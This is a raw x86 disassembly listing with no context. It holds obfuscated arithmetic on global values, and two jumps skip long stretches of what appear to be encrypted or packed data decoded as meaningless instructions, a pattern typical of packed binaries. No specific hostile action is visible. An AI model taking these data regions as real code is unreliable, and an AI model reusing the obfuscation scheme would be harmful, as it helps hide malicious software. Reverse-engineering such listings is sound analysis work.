  40ed18:	or     ecx,esi
  40ed1a:	mov    esi,DWORD PTR [ebp-0x6c]
  40ed1d:	push   esi
  40ed1e:	push   edx
  40ed1f:	push   ecx
  40ed20:	push   eax
  40ed21:	call   0x41594e
  40ed26:	mov    ecx,DWORD PTR [ebp-0x80]
  40ed29:	mov    esi,DWORD PTR [ebp-0x7c]
  40ed2c:	and    eax,ecx
  40ed2e:	mov    ecx,DWORD PTR ds:0x422708
  40ed34:	mov    ecx,DWORD PTR [ecx+0x1d0]
  40ed3a:	mov    ecx,DWORD PTR [ecx]
  40ed3c:	and    edx,esi
  40ed3e:	xor    eax,0x2b01
  40ed43:	xor    edx,0x2021
  40ed49:	xor    esi,esi
  40ed4b:	cmp    ecx,eax
  40ed4d:	jne    0x40f1dc
  40ed53:	cmp    esi,edx
  40ed55:	jne    0x40f1dc
  40ed5b:	mov    eax,DWORD PTR [ebp-0xa4]
  40ed61:	mov    ecx,DWORD PTR [ebp-0xc]
  40ed64:	add    eax,0x80ca
  40ed69:	or     eax,ecx
  40ed6b:	mov    ecx,DWORD PTR ds:0x4227a4
  40ed71:	or     eax,0x686
  40ed76:	xor    eax,0x3eec
  40ed7b:	lea    eax,[eax+ecx*1-0xc11b]
  40ed82:	xor    DWORD PTR ds:0x42279c,eax
  40ed88:	mov    eax,DWORD PTR [ebp-0x64]
  40ed8b:	and    eax,0x4dff
  40ed90:	add    eax,DWORD PTR [ebp-0x14]
  40ed93:	mov    ecx,DWORD PTR [ebp-0x94]
  40ed99:	xor    eax,0x676c
  40ed9e:	xor    edx,edx
  40eda0:	div    ecx
  40eda2:	mov    ecx,DWORD PTR [ebp-0x24]
  40eda5:	mov    edx,DWORD PTR [ebp-0x74]
  40eda8:	xor    ecx,0x6e1e
  40edae:	imul   ecx,edx
  40edb1:	mov    edx,DWORD PTR [ebp+0x8]
  40edb4:	push   0x4
  40edb6:	push   0xe4c37b20
  40edbb:	xor    eax,0x3884
  40edc0:	mov    eax,DWORD PTR [eax+edx*1]
  40edc3:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  40edca:	mov    eax,DWORD PTR [ebp-0x34]
  40edcd:	mov    edx,DWORD PTR [ebp-0xb4]
  40edd3:	lea    eax,[edx+eax*1-0x76d2]
  40edda:	mov    edx,DWORD PTR [ebp-0x44]
  40eddd:	mov    esi,DWORD PTR [ebp-0x84]
  40ede3:	or     eax,edx
  40ede5:	xor    edx,edx
  40ede7:	div    esi
  40ede9:	mov    edx,DWORD PTR [ebp-0x54]
  40edec:	add    eax,0x43d7
  40edf1:	xor    eax,0x5e6a
  40edf6:	add    eax,DWORD PTR [edx+ecx*1]
  40edf9:	mov    ecx,DWORD PTR ds:0x42279c
  40edff:	add    DWORD PTR [eax],ecx
  40ee01:	mov    eax,DWORD PTR [ebp-0x90]
  40ee07:	mov    ecx,DWORD PTR [ebp-0x8c]
  40ee0d:	mov    edx,DWORD PTR [ebp-0xa0]
  40ee13:	mov    esi,DWORD PTR [ebp-0x9c]
  40ee19:	sub    edx,eax
  40ee1b:	mov    eax,DWORD PTR [ebp-0xb0]
  40ee21:	sbb    esi,ecx
  40ee23:	mov    ecx,DWORD PTR [ebp-0xac]
  40ee29:	xor    edx,eax
  40ee2b:	mov    eax,DWORD PTR [ebp-0xc0]
  40ee31:	xor    esi,ecx
  40ee33:	mov    ecx,DWORD PTR [ebp-0xbc]
  40ee39:	add    edx,eax
  40ee3b:	adc    esi,ecx
  40ee3d:	add    edx,0x2313
  40ee43:	adc    esi,0x2a00
  40ee49:	push   esi
  40ee4a:	push   edx
  40ee4b:	call   0x422283
  40ee50:	mov    ecx,0x1207
  40ee55:	sub    ecx,eax
  40ee57:	push   0x0
  40ee59:	pop    eax
  40ee5a:	sbb    eax,edx
  40ee5c:	mov    edx,DWORD PTR ds:0x42279c
  40ee62:	xor    esi,esi
  40ee64:	jmp    0x40f1a7
  40ee69:	mov    bh,0x51
  40ee6b:	lods   eax,DWORD PTR ds:[esi]
  40ee6c:	xchg   edi,eax
  40ee6d:	mov    ebx,0x8571b7bb
  40ee72:	pop    ecx
  40ee73:	xor    ch,bl
  40ee75:	int3   
  40ee76:	repnz es shr ebp,1
  40ee7a:	adc    bh,BYTE PTR [esi-0x413bfe42]
  40ee80:	mov    esi,0xdb66ac1e
  40ee85:	pop    esp
  40ee86:	fst    DWORD PTR [edi+0x1b]
  40ee89:	sbb    bl,dl
  40ee8b:	add    ah,0x98
  40ee8e:	aaa    
  40ee8f:	sub    BYTE PTR ds:0xa6fef967,0x3d
  40ee96:	pop    edx
  40ee97:	mov    ecx,es
  40ee99:	in     eax,dx
  40ee9a:	(bad)  
  40ee9b:	call   0x1e96f4f9
  40eea0:	lea    esp,ds:0x3647c851
  40eea6:	xchg   esp,esi
  40eea8:	test   DWORD PTR [ecx+0x29],0xc4376717
  40eeaf:	xor    BYTE PTR [ebx],ch
  40eeb1:	adc    DWORD PTR [eax+0x30],ecx
  40eeb4:	icebp  
  40eeb5:	cmp    DWORD PTR [ebx+ecx*4+0x62da369c],esi
  40eebc:	loop   0x40ee60
  40eebe:	cmc    
  40eebf:	push   esp
  40eec0:	push   0xeff2b393
  40eec5:	xchg   ebx,eax
  40eec6:	out    dx,al
  40eec7:	test   bh,0xb0
  40eeca:	js     0x40eeac
  40eecc:	xchg   eax,edx
  40eece:	arpl   WORD PTR [edi],di
  40eed0:	bound  eax,QWORD PTR [edi+0xe1e44af]
  40eed6:	mov    esi,0x5663d46a
  40eedb:	mov    bh,0x5b
  40eedd:	retf   0xae7e
  40eee0:	inc    ebx
  40eee1:	mov    dh,0x6f
  40eee3:	pop    ds
  40eee4:	xchg   DWORD PTR [ecx+0x449b92bf],edi
  40eeea:	mov    cs,WORD PTR [ebx-0x6f]
  40eeed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeee:	sti    
  40eeef:	mov    esi,esp
  40eef1:	imul   ebp,DWORD PTR [ebp+0x47fcee6a],0xe0ee3d84
  40eefb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eefc:	mov    ebx,0x2a0d9afd
  40ef01:	inc    esi
  40ef02:	imul   ebp,DWORD PTR ds:[esi],0x21a051fd
  40ef09:	inc    esi
  40ef0a:	repnz sub ebx,ecx
  40ef0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef0e:	call   0x724c:0x22930e6d
  40ef15:	add    ecx,DWORD PTR [eax+0x15d40de2]
  40ef1b:	popf   
  40ef1c:	jecxz  0x40ef8f
  40ef1e:	into   
  40ef1f:	dec    ebp
  40ef20:	ret    
  40ef21:	(bad)  
  40ef24:	fstsw  WORD PTR [edx+0x3d]
  40ef28:	add    BYTE PTR [esi+0x3fd3a152],al
  40ef2e:	(bad)  
  40ef30:	and    DWORD PTR [eax-0x63],esp
  40ef33:	in     al,0xba
  40ef35:	dec    edx
  40ef36:	test   eax,0x946dce8c
  40ef3b:	(bad)  
  40ef3d:	mov    al,0x31
  40ef3f:	fmul   DWORD PTR [ebx]
  40ef41:	xchg   ecx,eax
  40ef42:	dec    edi
  40ef43:	cmp    al,0x66
  40ef45:	push   edi
  40ef46:	pop    esi
  40ef47:	jno    0x40eef6
  40ef49:	xor    DWORD PTR [ebx-0x45d41949],edx
  40ef4f:	mov    eax,0x8c837ac8
  40ef54:	jb     0x40efab
  40ef56:	mov    ah,0x52
  40ef58:	xchg   BYTE PTR [esi+0x6e],ch
  40ef5b:	stos   BYTE PTR es:[edi],al
  40ef5c:	retf   
  40ef5d:	mov    bl,0xa
  40ef5f:	push   cs
  40ef60:	clc    
  40ef61:	or     al,0x5c
  40ef63:	push   es
  40ef64:	adc    al,0xb
  40ef66:	mov    ecx,0xe562c54b
  40ef6b:	lea    ecx,[edx]
  40ef6d:	jg     0x40efbf
  40ef6f:	xchg   ebx,eax
  40ef70:	out    0xc9,eax
  40ef72:	test   eax,0x3d36ce21
  40ef77:	add    edi,DWORD PTR [ecx]
  40ef79:	popf   
  40ef7a:	iret   
  40ef7b:	loop   0x40ef0d
  40ef7d:	nop
  40ef7e:	push   edx
  40ef7f:	out    0x16,al
  40ef81:	inc    esi
  40ef82:	push   esi
  40ef83:	push   edx
  40ef84:	jns    0x40ef97
  40ef86:	jo     0x40ef36
  40ef88:	lock in eax,dx
  40ef8a:	push   0x46b1ca03
  40ef8f:	hlt    
  40ef90:	js     0x40ef6a
  40ef92:	daa    
  40ef93:	aas    
  40ef94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef95:	add    esi,DWORD PTR [esi-0x73f33341]
  40ef9b:	push   0xadea4c9
  40efa0:	cmc    
  40efa1:	shl    BYTE PTR [esi-0x18],1
  40efa4:	ds mov dh,al
  40efa7:	loop   0x40f020
  40efa9:	pop    ss
  40efaa:	fimul  DWORD PTR [ebx+0x674ca24f]
  40efb0:	hlt    
  40efb1:	push   eax
  40efb2:	dec    eax
  40efb3:	lahf   
  40efb4:	rcl    al,1
  40efb6:	nop
  40efb7:	fucomip st,st(2)
  40efb9:	sar    BYTE PTR ds:0xe97fb0,0x3a
  40efc0:	mov    al,0xb0
  40efc2:	mov    al,0x99
  40efc4:	addr16 push ss
  40efc6:	jnp    0x40f02f
  40efc8:	push   esp
  40efc9:	aaa    
  40efca:	retf   
  40efcb:	mov    DWORD PTR ds:0x7f7cdfd9,ebx
  40efd1:	test   al,0x8c
  40efd3:	rol    DWORD PTR [ebp-0x34],cl
  40efd6:	retf   0x7174
  40efd9:	inc    ebp
  40efda:	xor    al,0x9
  40efdc:	bound  esp,QWORD PTR ds:0xd8c79305
  40efe2:	mov    al,ds:0xba1f4fdd
  40efe7:	mov    bh,BYTE PTR [edx]
  40efe9:	ret    
  40efea:	sub    BYTE PTR [ecx],al
  40efec:	pop    ds
  40efed:	imul   ecx,ebx,0x0
  40eff0:	stos   BYTE PTR es:[edi],al
  40eff1:	jge    0x40f015
  40eff3:	rcl    DWORD PTR [edi],cl
  40eff5:	pop    esi
  40eff6:	sub    ah,BYTE PTR [edx+ecx*4+0x6c]
  40effa:	les    ebp,FWORD PTR [esi+0x6d04f8f]
  40f000:	jne    0x40f03e
  40f002:	and    al,0x5c
  40f004:	xor    eax,0xf386ef25
  40f009:	pushf  
  40f00a:	sbb    cl,ch
  40f00c:	mov    eax,ds:0xeac20e2
  40f011:	sahf   
  40f012:	push   ss
  40f013:	sti    
  40f014:	daa    
  40f015:	and    eax,0xf7b8145d
  40f01a:	int    0xb4
  40f01c:	cmp    eax,0x949c71b
  40f021:	add    BYTE PTR [eax-0x1ef0e45a],ch
  40f027:	popf   
  40f028:	or     bh,BYTE PTR [edi+0x76300b3]
  40f02e:	jnp    0x40efe9
  40f030:	stos   BYTE PTR es:[edi],al
  40f031:	and    BYTE PTR [ebx],bh
  40f033:	jnp    0x40f054
  40f035:	iret   
  40f036:	xlat   BYTE PTR ds:[ebx]
  40f037:	dec    esp
  40f038:	in     eax,0xfd
  40f03a:	mov    al,ds:0x1b69825
  40f03f:	ret    0x9c0d
  40f042:	leave  
  40f043:	cld    
  40f044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f045:	adc    dh,BYTE PTR [ebp+0x2f]
  40f048:	mov    esi,0x7c07da71
  40f04d:	push   ss
  40f04e:	fist   WORD PTR [ecx+0x23]
  40f051:	fs or  al,0xd4
  40f054:	push   0xb364a445
  40f059:	mov    edx,ebp
  40f05b:	pop    edx
  40f05c:	cs adc BYTE PTR es:[edi-0x40],bl
  40f061:	call   0xd8851f2a
  40f066:	clc    
  40f067:	cdq    
  40f068:	add    dl,ch
  40f06a:	sti    
  40f06b:	sub    ah,BYTE PTR [esi]
  40f06d:	imul   esp,DWORD PTR [ebx+0x78],0x2f8bcc81
  40f074:	les    ebp,FWORD PTR [esi+ebp*1]
  40f077:	dec    ebx
  40f078:	or     DWORD PTR [esi+0x8],edx
  40f07b:	mov    esp,0x8de1f58f
  40f080:	int3   
  40f081:	jnp    0x40f06c
  40f083:	iret   
  40f084:	sub    BYTE PTR [eax],0xce
  40f087:	xchg   esp,eax
  40f088:	aad    0x67
  40f08a:	scas   al,BYTE PTR es:[edi]
  40f08b:	fs inc eax
  40f08d:	mov    eax,0xd0b353cc
  40f092:	pop    edx
  40f093:	les    ecx,FWORD PTR [edi-0x34010a83]
  40f099:	jecxz  0x40f0ae
  40f09b:	in     al,0xe1
  40f09d:	cmp    eax,DWORD PTR [edi]
  40f09f:	out    0xec,eax
  40f0a1:	dec    edx
  40f0a2:	callw  0x5264
  40f0a6:	mov    dl,0x6a
  40f0a8:	sub    eax,0x580d334a
  40f0ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0af:	loopne 0x40f076
  40f0b1:	pop    ebp
  40f0b2:	mov    al,0x75
  40f0b4:	int3   
  40f0b5:	push   ecx
  40f0b6:	xchg   esi,eax
  40f0b7:	fisubr DWORD PTR ds:0xd7372487
  40f0bd:	out    0xe0,eax
  40f0bf:	loop   0x40f124
  40f0c1:	pop    edx
  40f0c2:	cmp    eax,0x219163ba
  40f0c7:	dec    eax
  40f0c8:	push   edi
  40f0c9:	sbb    al,0x45
  40f0cb:	fcmovb st,st(1)
  40f0cd:	je     0x40f092
  40f0cf:	sbb    BYTE PTR [edx-0x7a118b87],0xd2
  40f0d6:	(bad)  
  40f0d7:	scas   al,BYTE PTR es:[edi]
  40f0d8:	inc    edx
  40f0d9:	mov    DWORD PTR [ecx+0x1ce07fe6],edx
  40f0df:	icebp  
  40f0e0:	inc    ecx
  40f0e1:	shr    bh,1
  40f0e3:	ins    BYTE PTR es:[edi],dx
  40f0e4:	cmp    eax,DWORD PTR [ebx-0x413420dc]
  40f0ea:	mov    eax,0x34467037
  40f0ef:	(bad)  
  40f0f0:	sbb    al,0x80
  40f0f2:	sti    
  40f0f3:	inc    eax
  40f0f4:	jg     0x40f11b
  40f0f6:	scas   al,BYTE PTR es:[edi]
  40f0f7:	add    esp,DWORD PTR [edi]
  40f0f9:	not    ah
  40f0fb:	sub    BYTE PTR [ebx+0x31],bh
  40f0fe:	lods   al,BYTE PTR ds:[esi]
  40f0ff:	dec    edx
  40f100:	add    cl,cl
  40f102:	inc    esi
  40f103:	mov    ecx,0x2d957459
  40f108:	stos   DWORD PTR es:[edi],eax
  40f109:	push   0x897b72a1
  40f10e:	inc    ecx
  40f10f:	cmp    eax,0xc0df80f4
  40f114:	jge    0x40f099
  40f116:	ret    0x56a0
  40f119:	sbb    bh,0x82
  40f11c:	(bad)  
  40f11d:	pop    esp
  40f11e:	mov    al,ds:0x61707b07
  40f123:	int3   
  40f124:	test   dh,0x55
  40f127:	push   ebx
  40f128:	push   edx
  40f129:	jge    0x40f0df
  40f12b:	je     0x40f170
  40f12d:	leave  
  40f12e:	xchg   edx,eax
  40f12f:	nop
  40f130:	sub    eax,0x4718ea2a
  40f135:	pop    ecx
  40f136:	mov    ecx,0xa4faf292
  40f13b:	add    al,0xe6
  40f13d:	cmp    eax,0x9877553a
  40f142:	or     al,0xf1
  40f144:	outs   dx,DWORD PTR ds:[esi]
  40f145:	fbld   TBYTE PTR [esi+0x14]
  40f148:	xor    al,0x0
  40f14a:	in     eax,dx
  40f14b:	repz mov dl,0xf5
  40f14e:	add    DWORD PTR [edx-0xecd74ec],ecx
  40f154:	jle    0x40f19f
  40f156:	pusha  
  40f157:	mov    cl,0x9e
  40f159:	pop    ebx
  40f15a:	push   es
  40f15b:	and    BYTE PTR [edx],dh
  40f15d:	hlt    
  40f15e:	sti    
  40f15f:	dec    eax
  40f160:	loop   0x40f1b6
  40f162:	scas   al,BYTE PTR es:[edi]
  40f163:	test   DWORD PTR [edi],esi
  40f165:	push   ds
  40f166:	inc    edi
  40f167:	test   eax,0xe96fc3e9
  40f16c:	xor    ch,dl
  40f16e:	add    bh,BYTE PTR [ecx-0x24]
  40f171:	pop    eax
  40f172:	imul   ecx,DWORD PTR [ebp+0x2103d126],0x22bf53ee
  40f17c:	out    0xaf,eax
  40f17e:	push   ebx
  40f17f:	lahf   
  40f180:	mov    ch,bh
  40f182:	mov    edx,0xd6f42cee
  40f187:	cmp    al,0x99
  40f189:	pop    ds
  40f18a:	jae    0x40f1fe
  40f18c:	xor    DWORD PTR [esi-0x57],esp
  40f18f:	cld    
  40f190:	in     eax,dx
  40f191:	mov    WORD PTR [eax-0x6],?
  40f194:	int3   
  40f195:	xor    DWORD PTR ds:0xe2b63556,ebp
  40f19b:	xchg   ecx,eax
  40f19c:	je     0x40f1a4
  40f19e:	sub    al,0x84
  40f1a0:	inc    DWORD PTR [eax-0x1e]
  40f1a3:	outs   dx,BYTE PTR cs:[esi]
  40f1a5:	add    eax,0xfd13b1e
  40f1aa:	test   DWORD PTR ds:0x3b000000,ebp
  40f1b0:	lock jne 0x40f1dc
  40f1b7:	mov    eax,DWORD PTR [ebp-0x4]
  40f1ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f1bd:	add    eax,0x4296
  40f1c2:	shr    eax,0x2
  40f1c5:	or     eax,ecx
  40f1c7:	mov    ecx,DWORD PTR [ebp-0x10]
  40f1ca:	xor    eax,ecx
  40f1cc:	xor    eax,0x4e94
  40f1d1:	add    eax,DWORD PTR ds:0x42279c
  40f1d7:	mov    ds:0x4227a4,eax
  40f1dc:	pop    esi
  40f1dd:	leave  
  40f1de:	ret    0x4
  40f1e1:	push   ebp
  40f1e2:	mov    ebp,esp
  40f1e4:	sub    esp,0x58
  40f1e7:	push   ebx
  40f1e8:	push   esi
  40f1e9:	jmp    0x40f59d
  40f1ee:	jne    0x40f25e
  40f1f0:	mov    ds:0xb73caafc,al
  40f1f5:	je     0x40f1e5
  40f1f7:	fsubr  QWORD PTR [ecx+edx*8+0x67]
  40f1fb:	imul   esi,DWORD PTR [esi-0x6e],0x31
  40f1ff:	sbb    BYTE PTR [esi-0x413b1c42],bh
  40f205:	mov    esi,0xdaab42b0
  40f20a:	nop
  40f20b:	sub    esi,esp
  40f20d:	adc    al,BYTE PTR [edx+edi*4+0x7]
  40f211:	ins    DWORD PTR es:[edi],dx
  40f212:	dec    ebp
  40f213:	mov    ebp,0x8c890dfa
  40f218:	or     BYTE PTR [ebx],ch
  40f21a:	in     al,dx
  40f21b:	jbe    0x40f252
  40f21d:	jno    0x40f22e
  40f21f:	dec    BYTE PTR ds:0xdcff8208
  40f225:	cdq    
  40f226:	mov    cl,0xe1
  40f228:	outs   dx,DWORD PTR ds:[esi]
  40f229:	sbb    dh,BYTE PTR [ecx]
  40f22b:	mov    cl,bl
  40f22d:	mov    al,ds:0x721d95ba
  40f232:	mov    ecx,DWORD PTR [eax]
  40f234:	jl     0x40f27a
  40f236:	stc    
  40f237:	es dec edi
  40f239:	daa    
  40f23a:	scas   al,BYTE PTR es:[edi]
  40f23b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f23c:	and    cl,BYTE PTR [esi+edx*8+0x58]
  40f240:	and    BYTE PTR [ecx],dh
  40f242:	jo     0x40f1e8
  40f244:	das    
  40f245:	repz sub ecx,esp
  40f248:	inc    ecx
  40f249:	(bad)  
  40f24a:	cdq    
  40f24b:	loope  0x40f284
  40f24d:	inc    DWORD PTR ss:[edi+eax*4]
  40f251:	or     ch,BYTE PTR [ebp-0x7de78d86]
  40f257:	fiadd  WORD PTR [ebx+ebx*2-0x5d9447a8]
  40f25e:	adc    BYTE PTR [esi+0x9ad7f87],cl
  40f264:	aaa    
  40f265:	bound  edi,QWORD PTR [edx+ebp*4]
  40f268:	adc    eax,0x3de9da67
  40f26d:	pop    eax
  40f26e:	nop
  40f26f:	pop    edx
  40f270:	mov    DWORD PTR [eax-0x32a3b784],esp
  40f276:	push   esi
  40f277:	mov    al,0x92
  40f279:	sbb    BYTE PTR [ebp-0x67386d60],bh
  40f27f:	stc    
  40f280:	push   edx
  40f281:	cmp    esp,edi
  40f283:	bts    DWORD PTR [eax+0x6e],esi
  40f287:	lods   al,BYTE PTR ds:[esi]
  40f288:	and    DWORD PTR [ebx+0x2b],0xffffffa4
  40f28c:	jbe    0x40f2a1
  40f28e:	or     eax,0xdaac2574
  40f293:	xchg   edx,eax
  40f294:	daa    
  40f295:	nop
  40f296:	inc    ecx
  40f297:	push   ecx
  40f298:	dec    eax
  40f299:	mov    ?,WORD PTR [eax+0x10]
  40f29c:	outs   dx,DWORD PTR ds:[esi]
  40f29d:	test   BYTE PTR [edx],ch
  40f29f:	push   esi
  40f2a0:	mov    esp,0x9977deca
  40f2a5:	jle    0x40f2bb
  40f2a7:	add    ebp,DWORD PTR [ebx+edi*1]
  40f2aa:	pop    edi
  40f2ab:	push   ecx
  40f2ac:	lods   al,BYTE PTR ds:[esi]
  40f2ad:	jb     0x40f29e
  40f2af:	jns    0x40f2cf
  40f2b1:	and    DWORD PTR [edx-0x69766180],edi
  40f2b7:	out    0x47,eax
  40f2b9:	lds    esp,FWORD PTR [edi+edi*1-0x3de45090]
  40f2c0:	aad    0xe8
  40f2c2:	inc    ebx
  40f2c3:	xor    al,0xa4
  40f2c5:	jae    0x40f2ce
  40f2c7:	inc    ecx
  40f2c8:	ret    
  40f2c9:	xchg   esi,eax
  40f2ca:	(bad)  
  40f2cb:	jmp    0x3d1bd843
  40f2d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2d1:	inc    ecx
  40f2d2:	dec    edi
  40f2d3:	out    0xa3,eax
  40f2d5:	cmp    ecx,DWORD PTR [ecx-0x2aaecc37]
  40f2db:	shl    BYTE PTR [edx],1
  40f2dd:	cli    
  40f2de:	pop    esi
  40f2df:	rcl    DWORD PTR [ebx+esi*2],cl
  40f2e2:	iret   
  40f2e3:	jo     0x40f29f
  40f2e5:	pop    ebp
  40f2e6:	push   ecx
  40f2e7:	in     al,dx
  40f2e8:	mov    ds:0x70856720,al
  40f2ed:	(bad)  
  40f2ee:	cli    
  40f2ef:	mov    ah,0xd
  40f2f1:	xchg   ecx,eax
  40f2f2:	push   esi
  40f2f3:	fdiv   QWORD PTR [edx+0x44]
  40f2f6:	xor    DWORD PTR [eax+0x4feab08b],edi
  40f2fc:	retf   
  40f2fd:	test   eax,0xa2f59049
  40f302:	pop    ds
  40f303:	nop
  40f304:	pop    ebx
  40f305:	jle    0x40f318
  40f307:	sar    bl,0x3f
  40f30a:	xor    al,0x78
  40f30c:	adc    eax,0x9d1d836f
  40f311:	stos   DWORD PTR es:[edi],eax
  40f312:	sub    DWORD PTR [edi-0x6c4b4101],edx
  40f318:	xchg   edi,eax
  40f319:	call   0x9aa6f7b4
  40f31e:	outs   dx,BYTE PTR ds:[esi]
  40f31f:	cwde   
  40f320:	ror    ebx,0x1f
  40f323:	jp     0x40f364
  40f325:	mov    al,0x1d
  40f327:	cmp    al,0x47
  40f329:	leave  
  40f32a:	add    al,bh
  40f32c:	sub    DWORD PTR [ebx],ebp
  40f32e:	and    ebp,esp
  40f330:	add    DWORD PTR [eax],eax
  40f332:	das    
  40f333:	addr16 xor eax,0xf3fbaa05
  40f339:	nop
  40f33a:	lock retf 0x1710
  40f33e:	in     al,dx
  40f33f:	std    
  40f340:	aad    0x9d
  40f342:	bound  edi,QWORD PTR ds:0xe9d3b2c
  40f348:	mov    DWORD PTR [edi+0x7a8176d4],ebx
  40f34e:	retf   0x2dd8
  40f351:	mov    ecx,0xd0358a82
  40f356:	into   
  40f357:	jle    0x40f329
  40f359:	aas    
  40f35a:	test   eax,0x2b462a76
  40f35f:	pop    ecx
  40f360:	jns    0x40f361
  40f362:	sahf   
  40f363:	outs   dx,DWORD PTR ds:[esi]
  40f364:	push   esi
  40f365:	and    eax,0x8c1f63f1
  40f36a:	and    esp,edi
  40f36c:	pop    esi
  40f36d:	ret    0x99b7
  40f370:	loopne 0x40f2f2
  40f372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f373:	jbe    0x40f388
  40f375:	repz mov WORD PTR [ebx+ebx*8-0x2d],ss
  40f37a:	mov    dl,0xf9
  40f37c:	push   ebp
  40f37d:	inc    ebp
  40f37e:	push   0xffffff97
  40f380:	popf   
  40f381:	rcr    BYTE PTR ds:0xb7fb73dd,1
  40f387:	add    al,0xfa
  40f389:	imul   ebx,DWORD PTR [edx-0x2f],0x11
  40f38d:	fbstp  TBYTE PTR [edx+0x86406ba]
  40f393:	outs   dx,BYTE PTR ds:[esi]
  40f394:	adc    eax,DWORD PTR [esi+0x4b]
  40f397:	loope  0x40f368
  40f399:	fidiv  DWORD PTR [ebp-0x3b]
  40f39c:	add    BYTE PTR fs:[ebx-0xc],bh
  40f3a0:	mov    esp,0xf1702804
  40f3a5:	adc    eax,0x73db17a8
  40f3aa:	stos   DWORD PTR es:[edi],eax
  40f3ab:	sub    eax,0xe81d7a1
  40f3b0:	outs   dx,DWORD PTR ds:[esi]
  40f3b1:	adc    BYTE PTR [eax+0x49],ah
  40f3b4:	or     eax,0xe17e7824
  40f3b9:	and    eax,0xd4cfb938
  40f3be:	push   eax
  40f3bf:	mov    al,ds:0x1c838ef1
  40f3c4:	test   al,0x7b
  40f3c6:	push   0x856e6609
  40f3cb:	adc    BYTE PTR [ebx+0x4f420d6d],0x4b
  40f3d2:	jg     0x33ff46f8
  40f3d8:	sbb    BYTE PTR gs:[esi-0x17a7354],dh
  40f3df:	xor    esp,eax
  40f3e1:	add    bh,BYTE PTR [eax+0x3a]
  40f3e4:	cmp    ebp,DWORD PTR [ecx+0x42]
  40f3e7:	call   0x2291:0xc2ea7a07
  40f3ee:	(bad)  
  40f3ef:	dec    esi
  40f3f0:	mov    edi,0x57129a39
  40f3f5:	dec    edi
  40f3f6:	or     DWORD PTR [ecx],0xffffffaa
  40f3f9:	lahf   
  40f3fa:	std    
  40f3fb:	inc    ecx
  40f3fc:	inc    ecx
  40f3fd:	mov    ds:0x965cd66c,eax
  40f402:	pop    edx
  40f403:	sbb    esi,eax
  40f405:	in     al,dx
  40f406:	cmp    dh,BYTE PTR [edi-0x2c]
  40f409:	adc    edx,DWORD PTR [eax+0xd]
  40f40c:	ins    BYTE PTR es:[edi],dx
  40f40d:	loop   0x40f486
  40f40f:	stc    
  40f410:	jo     0x40f475
  40f412:	shl    DWORD PTR [edi+ebp*4+0x4f85aecc],cl
  40f419:	rcl    DWORD PTR fs:0x5eac9ab3,0x1c
  40f421:	mov    eax,0x7544f20a
  40f426:	jg     0x40f488
  40f428:	shr    DWORD PTR [edx-0x21],0x63
  40f42c:	dec    edi
  40f42d:	sub    dl,BYTE PTR [esi]
  40f42f:	xchg   edx,eax
  40f430:	call   0x1ab4:0xd12e6ba0
  40f437:	and    BYTE PTR [edx],bl
  40f439:	jnp    0x40f448
  40f43b:	push   edi
  40f43c:	jmp    0xcf64:0xf292b7bc
  40f443:	push   ebp
  40f444:	pop    es
  40f445:	dec    ebx
  40f446:	leave  
  40f447:	mov    al,0xd4
  40f449:	cmp    bl,BYTE PTR ss:[edi+0x40]
  40f44d:	adc    cl,BYTE PTR [edi+0x4c]
  40f450:	push   0xffffffe4
  40f452:	ins    BYTE PTR es:[edi],dx
  40f453:	cmp    edx,DWORD PTR [esi-0x6626179b]
  40f459:	pop    esi
  40f45a:	stos   BYTE PTR es:[edi],al
  40f45b:	add    ecx,DWORD PTR [esp+eax*8]
  40f45e:	call   0x54d01025
  40f463:	icebp  
  40f464:	fild   WORD PTR [eax+0x2a2460cb]
  40f46a:	mov    al,0xa4
  40f46c:	add    al,0x4f
  40f46e:	test   al,0xe0
  40f470:	sbb    al,0x7d
  40f472:	push   cs
  40f473:	xlat   BYTE PTR ds:[ebx]
  40f474:	test   DWORD PTR [edi-0x16db9c07],edi
  40f47a:	inc    ebx
  40f47b:	je     0x40f446
  40f47d:	push   0x16
  40f47f:	or     dl,al
  40f481:	pop    eax
  40f482:	xchg   ecx,eax
  40f483:	(bad)  
  40f484:	xor    eax,0x3594b150
  40f489:	cdq    
  40f48a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f48b:	rcr    DWORD PTR [edx],cl
  40f48d:	out    0x1b,al
  40f48f:	jno    0x40f4d7
  40f491:	idiv   DWORD PTR [edx]
  40f493:	(bad)  
  40f494:	cdq    
  40f495:	jl     0x40f44c
  40f497:	test   eax,0x4cb7cf1c
  40f49c:	inc    edx
  40f49d:	lods   eax,DWORD PTR ds:[esi]
  40f49e:	inc    ebp
  40f49f:	jecxz  0x40f4cd
  40f4a1:	les    ecx,FWORD PTR [edx]
  40f4a3:	mov    ch,0xa5
  40f4a5:	add    eax,0x5c2028da
  40f4aa:	fcomp  DWORD PTR [esi]
  40f4ac:	inc    ecx
  40f4ad:	fs out dx,al
  40f4af:	popa   
  40f4b0:	call   0xe120:0xf9423e77
  40f4b7:	mov    ss,esi
  40f4b9:	fsub   QWORD PTR [esp+eiz*8]
  40f4bc:	push   es
  40f4bd:	loop   0x40f452
  40f4bf:	push   es
  40f4c0:	add    eax,0xeb3db46
  40f4c5:	imul   edi,DWORD PTR [ecx+0x50],0x339ac262
  40f4cc:	push   cs
  40f4cd:	jo     0x40f4f6
  40f4cf:	rcl    DWORD PTR es:[ebp-0x5c008669],1
  40f4d6:	cmp    DWORD PTR [eax+0x21155c1a],0x1cba4bf3
  40f4e0:	mov    dh,0x4e
  40f4e2:	fidivr DWORD PTR [esp+eiz*4-0x55]
  40f4e6:	or     BYTE PTR [ebx-0x7b8509e2],dl
  40f4ec:	add    al,0x55
  40f4ee:	xchg   ecx,eax
  40f4ef:	add    eax,0x8bf071c8
  40f4f4:	(bad)  
  40f4f5:	xor    DWORD PTR [ebx+0x4f],ebp
  40f4f8:	inc    esi
  40f4f9:	mov    ebp,0x90072c9a
  40f4fe:	cli    
  40f4ff:	mov    ebp,0xa7478b83
  40f504:	dec    esi
